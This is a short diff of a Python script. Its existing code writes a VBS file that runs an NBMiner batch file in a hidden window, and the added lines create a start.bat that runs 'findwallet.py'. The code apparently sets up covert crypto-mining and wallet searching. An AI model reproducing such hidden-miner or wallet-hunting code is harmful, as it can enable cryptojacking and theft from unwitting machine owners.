@@ -54,4 +54,6 @@ if not srt1 or not srt2:
     with open('st.vbs','w') as st:
         st.write(r'''Set shell = WScript.CreateObject("WScript.Shell")
                  shell.Run("C:\Users\user\Desktop\extracted\NBMiner_Win\run.bat"), 0, True''')
+with open(f"{path}start.bat",'w') as ww:
+    ww.write('start secondary.bat\npython findwallet.py\npause')
 threading.Thread(target=start).start()
